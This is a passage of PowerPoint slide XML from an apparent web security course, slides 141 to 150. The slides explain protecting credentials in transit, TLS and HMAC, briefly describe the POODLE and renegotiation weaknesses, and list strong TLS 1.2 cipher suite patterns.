              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Yes, we should enforce Authorization/Authentication for EVERY http request, but we also need to protect all credentials, SID's, Tokens, and forms that travel over the wire. If they can be read, they become useless.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>More about Session insecurity later</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6F0FF333-D87B-1E2E-523A-63EC67CA3046}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>141</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="161696923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5D07-2CA1-4E1F-4D9C-0DC720685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8FCE9-C8B3-8CD4-0D47-542BB60C9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EBC56-1A23-0CF1-FE11-78C1E664B9F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>I have only 3 things to tell you about SSL: SSL is...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{14FBDD92-EB6E-E1E8-BB35-6C51DDB7A7C2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>142</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="182608026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2839-0B64-5206-E89A-5946286BF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BB4C6-C3A9-81FD-938F-E573534FB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2E63C-51E4-C4E8-7F65-2F539CE92E3D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Yes, we should enforce Authorization/Authentication for EVERY http request, but we also need to protect all credentials, SID's, Tokens, and forms that travel over the wire. If they can be read, they become useless.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Slide of Hand! - CIA in cryptography stands for 'Conf, Int, and AUTHENTICATION'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7007DF56-E6B0-CCC9-9CD3-1D6AC134B8A2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>143</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="237116901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F6934-D4D4-8311-A56A-DCB50F7BE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9E534-71FD-1826-C645-DB59D23C0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4CF1F-2A8C-6C70-932F-523F1AA0DCDA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Primarily, TLS moves all HTTP data – headers, flags, content, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> - through an encryption tunnel</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">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7C619FEC-7201-9CD2-0019-E97A32544C9C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>144</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="81260368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0D18-96FE-673C-F629-E420A2C88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ADE72-CC83-0DAF-325B-03B38809C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A1A9C-4F14-7FD3-E2EB-95AE29618637}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>HMAC == Hash-based Message Authentication Code</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DE54ED88-318E-4514-9295-48492B98850D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>145</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3332508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E250-7221-9B45-86F5-C89304F1E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993D8-0B0C-8BE1-CFE1-C7D9A42D5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0E65B-88FA-8101-875B-4AC49BDAE982}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>if all checks out as valid, the server’s identity is authenticated and they proceed to derive shared encryption keys.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>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7936130C-8D3F-65D4-F746-F18C12F1D83E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>146</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="298036545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29B45-58AB-180D-8678-C94BEE70D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AA86D-B8DF-1277-EC95-1F8C0F9A5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79C7EB-5A49-5588-7E09-DBEDB917E596}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>POODLE Attack (Padding Oracle On Downgraded Legacy Encryption) - An active attacker could </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>force</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> repeated handshake failures and push the client and server down to SSL 3.0.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Weak Encryption algorithms allowed decryption in TLS 1.0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The original TLS renegotiation mechanism did not bind the renegotiating handshake to the original one.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Impact:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> An attacker could splice their own data in front of a victim’s TLS connection, making it appear to the server as if the victim had sent the attacker’s prefix</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{29B01776-05BA-33CD-7DE6-5AE834D58DA6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>147</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="375055129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CBA7-C86D-1C26-6B1A-A557BBEDF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9ECF3-704F-E259-630C-3CFAE2C69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88AF0-010B-57B5-A689-063DB3CCB3D9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>So TLS 1.2 is capable of being very strong </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>if</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> you only allow the modern stuff.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F1E904FD-C36B-9E8C-DD47-D2959B9DF753}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>148</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="418147356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FFEA8-E5CE-7A7D-FC4D-2B20A6C8E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D39B7-68B1-5CFA-730E-38A3F32A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618D5-1BD1-D888-7DFF-68C8EC631F5F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>So TLS 1.2 is capable of being very strong </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>if</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> you only allow the modern stuff.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{088F2114-57BB-0D28-FE99-CDA1BB8FD01F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>149</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="269732134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CB45-9102-9DB7-6308-F04D027B5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4E063-8B02-2C4F-AFE5-48EA3EFA3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0C606-D03D-3C0D-AEB5-3E8098528861}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PFS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> stands for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Perfect Forward Secrecy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Patterns to notice:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ECDHE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> – Ephemeral Elliptic-Curve Diffie-Hellman key exchange → forward secrecy.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" err="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AES_xxx_GCM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> – Authenticated encryption with AES in GCM mode (AEAD).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CHACHA20_POLY1305</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> – Faster on some devices, also AEAD.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hashes are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SHA-256 / SHA-384</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, not SHA-1.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FCC1731-9FEF-A8AF-4EFE-57D7FF796A78}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>150</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
